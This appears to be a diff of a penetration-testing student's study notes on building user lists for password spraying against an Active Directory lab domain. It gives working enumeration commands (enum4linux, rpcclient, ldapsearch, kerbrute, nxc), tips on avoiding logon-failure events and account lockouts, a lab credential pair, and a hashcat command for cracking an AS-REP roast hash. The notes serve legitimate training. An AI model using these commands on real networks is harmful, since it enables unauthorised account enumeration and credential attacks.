@@ -1,135 +1,109 @@
-# Section 10 — Password Spraying: Building a Target User List
-
-## Methods (choose based on access level)
-
-| Access Level | Method |
-|-------------|--------|
-| No creds, SMB NULL session available | enum4linux, rpcclient, crackmapexec --users |
-| No creds, LDAP anon bind available | ldapsearch, windapsearch |
-| No creds, neither available | Kerbrute + wordlist, LinkedIn, email harvesting |
-| Valid creds | crackmapexec --users (fastest, also shows badpwdcount) |
+# Section 10 — Building a User List for Spraying
 
 ---
 
-## SMB NULL Session — Pull User List
+## QUICK REFERENCE — Decision Tree
 
-### enum4linux
+```
+Have valid creds?
+  YES → nxc smb DC_IP -u USER -p PASS --users   (fastest, shows badpwdcount)
+  NO  → SMB NULL session available?
+          YES → enum4linux -U DC_IP  OR  rpcclient enumdomusers  OR  nxc --users (no creds)
+          NO  → LDAP anon bind available?
+                  YES → ldapsearch / windapsearch
+                  NO  → kerbrute userenum + jsmith.txt / LinkedIn
+```
+
+---
+
+## Lab Results
+
 ```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
+# Result: 56 valid usernames from 48,705 tested in ~11 seconds
+
+# Bonus: mmorgan auto-flagged as AS-REP roastable
+# Hash dumped: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
+# Crack: hashcat -m 18200 mmorgan.hash /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## Method 1 — SMB NULL Session (No Creds)
+
+```bash
+# enum4linux
 enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
-```
 
-### rpcclient
-```bash
+# rpcclient
 rpcclient -U "" -N 172.16.5.5
-# then:
-enumdomusers
-```
+# then: enumdomusers
 
-### crackmapexec (unauthenticated NULL session)
-```bash
-crackmapexec smb 172.16.5.5 --users
+# nxc (no creds)
+nxc smb 172.16.5.5 --users
 ```
-
-**crackmapexec `--users` shows `badpwdcount`** — critical for spraying safely. Remove any account near the lockout threshold from your list before spraying.
 
 ---
 
-## LDAP Anonymous Bind — Pull User List
+## Method 2 — LDAP Anonymous Bind (No Creds)
 
-### ldapsearch
 ```bash
+# ldapsearch
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
-```
 
-### windapsearch
-```bash
+# windapsearch
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+# -u "" = anonymous | -U = users only
 ```
-`-u ""` = anonymous bind, `-U` = users only
 
 ---
 
-## Kerbrute — Username Enumeration (No Creds Needed)
+## Method 3 — Kerbrute (No Creds, Stealthy)
 
 ```bash
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -o valid_users.txt
 ```
 
-**Why Kerbrute is stealthy for enumeration:**
-- Uses Kerberos Pre-Authentication — does NOT generate Event ID 4625 (logon failure)
-- Generates Event ID 4768 (TGT requested) — only logged if Kerberos audit is enabled
-- Does not lock out accounts during enumeration phase
+**Why kerbrute enumeration is stealthy:** Uses Kerberos pre-auth — does NOT generate Event ID 4625. Only generates 4768 if Kerberos audit is enabled.
 
-**Switch to spraying with Kerbrute = failed attempts DO count toward lockout threshold.**
+**Note:** Kerbrute **spraying** is NOT stealthy — failed attempts count toward lockout.
 
 Wordlists:
 ```
-/opt/jsmith.txt                                    # common flast format
+/opt/jsmith.txt
 ~/SecLists/Usernames/xato-net-10-million-usernames.txt
 ```
 
 ---
 
-## Credentialed Enumeration — crackmapexec
+## Method 4 — Credentialed (Best — Shows badpwdcount)
 
 ```bash
-crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --users
+nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users
+
+# Filter out accounts near lockout threshold (threshold=5, skip 3+)
+nxc smb 172.16.5.5 -u wley -p 'transporter@4' --users | grep -v "badpwdcount: [3-9]"
 ```
 
-Gives full user list + `badpwdcount` + `baddpwdtime` per account.
-
-**Filter out accounts near lockout threshold before spraying:**
-```bash
-crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --users | grep -v "badpwdcount: [3-9]"
-```
+**`badpwdcount` is critical** — skip any account at 3+ when threshold is 5.
 
 ---
 
 ## Pre-Spray Logging Checklist
 
-Always document before and during a spray:
-- [ ] Accounts targeted
+- [ ] Accounts targeted (user list file)
 - [ ] DC used
-- [ ] Time and date of each spray
+- [ ] Time and date of each spray attempt
 - [ ] Password(s) attempted
 
-If an account lockout occurs → hand notes to client to cross-check their logs.
-
----
-
-## Decision Tree — Which Method to Use
-
-```
-Have valid creds?
-  YES → crackmapexec --users (fastest, shows badpwdcount)
-  NO  → SMB NULL session available?
-          YES → enum4linux / rpcclient / crackmapexec --users (no creds)
-          NO  → LDAP anon bind available?
-                  YES → ldapsearch / windapsearch
-                  NO  → Kerbrute + jsmith.txt / linkedin2username
-```
-
----
-
-## Lab Results (INLANEFREIGHT.LOCAL)
-
-```bash
-kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
-# Result: 56 valid usernames from 48,705 tested in ~11 seconds
-```
-
-**Bonus find:** `mmorgan` flagged as AS-REP roastable (no pre-auth required) — hash dumped automatically by Kerbrute:
-```
-$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
-```
-Crack with: `hashcat -m 18200 mmorgan.hash /usr/share/wordlists/rockyou.txt`
+If lockout occurs → hand notes to client to cross-check their logs.
 
 ---
 
 ## Exam Notes
 
-- `crackmapexec --users` is best when credentialed — badpwdcount tells you who to skip
-- Kerbrute enumeration = stealthy (no 4625 events), spraying = not stealthy (counts toward lockout)
-- SYSTEM access on domain-joined host = can enumerate AD like a domain user
-- Always check badpwdcount before spraying — skip accounts at 3+ if threshold is 5
+- `nxc --users` credentialed = fastest + shows badpwdcount — always use when you have creds
+- Kerbrute enum = stealthy (no 4625), kerbrute spray = not stealthy
+- AS-REP roastable accounts auto-flagged by Kerbrute during enum — grab that hash
+- Check badpwdcount before spraying — skip accounts at 3+ if threshold is 5
 - Log everything — time, date, accounts, passwords tried
